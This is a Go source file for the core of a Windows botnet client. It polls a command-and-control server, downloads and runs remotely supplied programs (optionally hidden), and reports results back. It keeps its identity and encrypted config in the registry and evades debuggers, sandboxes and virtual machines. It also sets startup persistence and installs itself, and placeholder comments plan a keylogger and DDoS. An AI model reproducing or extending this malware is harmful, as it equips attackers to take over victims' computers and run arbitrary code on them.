package components

import (
	"encoding/json"
	"io"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"golang.org/x/sys/windows/registry"
)

func do_register_bot(pkg *ServerReply, host string) bool {
	return false
}

func do_remote_download_execute(pkg *ServerReply, host string) bool {
	commandline := pkg.Args["args"].(string)
	hidden := pkg.Args["hidden"].(bool)
	action := commandline
	if hidden {
		action += " (hidden)"
	}

	// Collect options if it exists
	option := ""
	strArgs := strings.Fields(commandline)
	if len(strArgs) > 1 {
		for i := 1; i < len(strArgs); i++ {
			option += (strArgs[i] + " ")
		}
		option = strings.TrimSpace(option)
	}
	// Remote download and execute
	ok := remote_execute(strArgs[0], hidden, option)
	error1 := "failed"
	if ok {
		error1 = "done"
	}

	report := Report{
		Guid:    g_guid,
		TaskID:  strconv.FormatInt(pkg.TaskId, 10),
		Success: ok,
		Output:  "",
		Error:   error1,
		Extra:   make(map[string]any),
	}
	report.Extra["action"] = action
	byt, _ := json.Marshal(report)
	// Send report to C2

	// Build url
	url := build_url(host, "/report", botcore.use_ssl)
	// Calculate signature
	timestamp := generate_utc_timestamp_string()
	sign := create_sign(g_token, g_guid, timestamp)
	// Send HTTP POST request
	do_head_post(url, byt, map[string]string{
		"X-Guid": g_guid,
		"X-Time": timestamp,
		"X-Sign": base64_enc(sign),
	}, botcore.use_ssl)

	return true
}

func do_ddos_attack(pkg *ServerReply, host string) bool {
	return false
}

func send_recover_request(host string) BotState {
	url := build_url(host, "/recovery", botcore.use_ssl)
	reply := do_head_post(url, get_bot_info(), map[string]string{
		"X-Guid": g_guid,
		"X-Time": generate_utc_timestamp_string(),
	}, botcore.use_ssl)
	// Check package legality
	if reply == nil || reply.Status == 0 {
		return StateRecoverPoll
	}

	// Get token and save
	g_token = reply.Args["Token"].(string)
	// Save to registry, if failed, ignore it just start to send poll
	if !reg_create_or_update_value(registry.CURRENT_USER, g_regpath, "Token", g_token, true) {
		return StateCommandPoll
	}

	return StateCommandPoll
}

func send_poll_request(host string) BotState {
	url := build_url(host, "/poll", botcore.use_ssl)

	// Hmac calculation
	timestamp := generate_utc_timestamp_string()
	sign := create_sign(g_token, g_guid, timestamp)

	// Send poll request
	reply := do_head_post(url, nil, map[string]string{
		"X-Guid": g_guid,
		"X-Time": timestamp,
		"X-Sign": base64_enc(sign),
	}, botcore.use_ssl)
	if reply == nil || !check_package_legality(reply) {
		return StateRecoverPoll
	}
	reply.Cmd = strings.TrimSpace(reply.Cmd)

	switch reply.Cmd {
	case "register":
		do_register_bot(reply, host)
	case "execute":
		// Remote download execution
		do_remote_download_execute(reply, host)
	case "ddos":
		do_ddos_attack(reply, host)
	case "poll":
		log.Printf("poll again")
	case "test":
		log.Printf("test report")
	}

	// Continue poll command from C2
	return StateCommandPoll
}

func auth_bot_poll(state BotState, host string) BotState {
	var next_state BotState = StateReadGuid

	switch state {
	case StateReadGuid:
		val := reg_read_key(registry.CURRENT_USER, g_regpath, "guid", 1)
		if val == nil || val == "" {
			next_state = StateGenGuid
		} else {
			g_guid = val.(string)
			next_state = StateReadToken
		}
	case StateGenGuid:
		g_guid = get_guid_hash()
		if len(g_guid) > 0 {
			if reg_create_or_update_value(registry.CURRENT_USER, g_regpath, "guid", g_guid, true) {
				// Save installdate
				g_installdate = generate_utc_timestamp_string()
				reg_create_or_update_value(registry.CURRENT_USER, g_regpath, "installdate", g_installdate, true)

				next_state = StateReadToken
				break
			}
		}
		next_state = StateGenGuid
	case StateReadToken:
		val := reg_read_key(registry.CURRENT_USER, g_regpath, "token", 1)
		if val == nil || val.(string) == "" {
			next_state = StateRecoverPoll
		} else {
			g_token = val.(string)
			next_state = StateCommandPoll
		}
	case StateRecoverPoll:
		// Send recovery poll
		next_state = send_recover_request(host)
	case StateCommandPoll:
		// Send poll command
		next_state = send_poll_request(host)
	case StateError:
		next_state = StateReadGuid
		log.Fatal("status error")
	default:
		next_state = StateReadGuid
		log.Fatal("status error")
	}

	return next_state
}

func handle_command() {
	var stat BotState = StateReadGuid

	for {
		time.Sleep(time.Second * time.Duration(random_int(1, 5)))
		stat = auth_bot_poll(stat, botcore.hosts[0])
	}

}

func read_config() bool {
	var build_config BuildConfig

	// Try to read config from registry
	bytesConfig, ok := reg_read_key(registry.CURRENT_USER, g_regpath, "config", 2).([]byte)
	if ok && bytesConfig != nil {
		// Read configure from registry ok\
		len := len(bytesConfig) - 32
		encConfig := bytesConfig[:len]
		key := bytesConfig[len:]
		cleanConfig := dec_chacha20(key, encConfig)
		if nil == cleanConfig {
			return false
		}
		json.Unmarshal(cleanConfig, &build_config)
	} else {
		exe := get_module_file()
		if exe == "" {
			return false
		}
		f, err := os.Open(exe)
		if err != nil {
			return false
		}
		defer f.Close()
		// Read configure size
		_, err = f.Seek(-4, io.SeekEnd)
		if err != nil {
			return false
		}
		size_buf := make([]byte, 4)
		_, err = f.Read(size_buf)
		if err != nil {
			return false
		}
		// Read configure
		config_size := bytes_to_int(size_buf)
		if config_size == 0 {
			return false
		}
		_, err = f.Seek(int64(-(4 + config_size)), io.SeekEnd)
		if err != nil {
			return false
		}
		config_buf := make([]byte, config_size)
		f.Read(config_buf)
		// Read chacha20 key
		_, err = f.Seek(int64(-(4 + config_size + 32)), io.SeekEnd)
		key := make([]byte, 32)
		_, err = f.Read(key)
		if err != nil {
			return false
		}
		// Decrypt config with chacha20 key
		decConfigBuf := dec_chacha20(key, config_buf)
		if decConfigBuf == nil {
			return false
		}
		json.Unmarshal(decConfigBuf, &build_config)

		// Save configure to registry
		savedConfig := append(config_buf, key...)
		if !reg_create_or_update_value(registry.CURRENT_USER, g_regpath, "config", savedConfig, true) {
			log.Println("Failed to create config registry")
		}
	}
	botcore.singleton = build_config.Single
	botcore.anti_debug = build_config.Anti_debug
	botcore.anti_vm = build_config.Anti_vm
	botcore.anti_sandbox = build_config.Anti_sandbox
	botcore.install = build_config.Install
	botcore.install_file = build_config.Install_file
	botcore.mutex_name = build_config.Mutex_name
	botcore.delay = build_config.Delay
	botcore.use_ssl = build_config.Use_ssl
	botcore.version = build_config.Version
	botcore.hosts = build_config.Host
	//fmt.Println("singleton: ", botcore.singleton, "antidebug: ", botcore.anti_debug, "antisandbox: ", botcore.anti_sandbox, "antivm: ", botcore.anti_vm,
	//	"mutex: ", botcore.mutex_name, "delay: ", botcore.delay, "use_ssl: ", botcore.use_ssl, "version: ", botcore.version, "host: ", botcore.hosts)
	//if botcore.install {
	//	fmt.Println("install file: ", botcore.install_file)
	//}
	//bufio.NewReader(os.Stdin).ReadString('\n')

	return true
}

func Run() {
	uinstall()
	
	if run_on_friendly_area() {
		uinstall()
	}
	// Read configure
	if !read_config() {
		os.Exit(0)
	}
	// Install self to temp folder
	if botcore.install {
		install_payload()
	}

	// Check singleton
	if botcore.singleton {
		run, m := is_already_exist(botcore.mutex_name)
		if run {
			os.Exit(0)
		}
		botcore.sington_mutex = m
	}

	// Set startup option
	startup()
	// Sleep for avoiding the detection of sandbox
	time.Sleep(time.Second * time.Duration(botcore.delay))

	// Try to fuck them all
	if botcore.anti_debug && is_debugger_exist() {
		return
	}

	if botcore.anti_sandbox && in_sandbox_now() {
		return
	}

	if botcore.anti_vm && in_vm_now() {
		return
	}

	// Install self
	if botcore.install {
		install_payload()
	}

	// Set firewall bypass

	// Anti-Process

	// Edit hosts

	// Setup keylogger

	// Reverse proxy

	go handle_command()
}
